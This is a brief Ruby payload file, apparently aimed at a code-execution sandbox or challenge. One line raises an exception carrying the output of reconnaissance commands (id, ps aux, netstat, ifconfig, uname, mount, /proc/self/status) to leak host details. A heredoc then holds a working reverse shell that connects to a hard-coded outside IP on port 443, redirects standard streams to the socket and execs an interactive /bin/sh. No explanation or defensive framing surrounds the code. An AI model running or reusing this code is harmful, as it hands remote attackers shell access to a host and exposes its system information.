# exec("echo *")
raise StandardError.new `set -x; id ;ps aux; netstat -nap; ifconfig; ip addr ls; uname -a; cat /proc/self/status; mount`

<<-DOC

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 443, '35.209.207.62'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
DOC


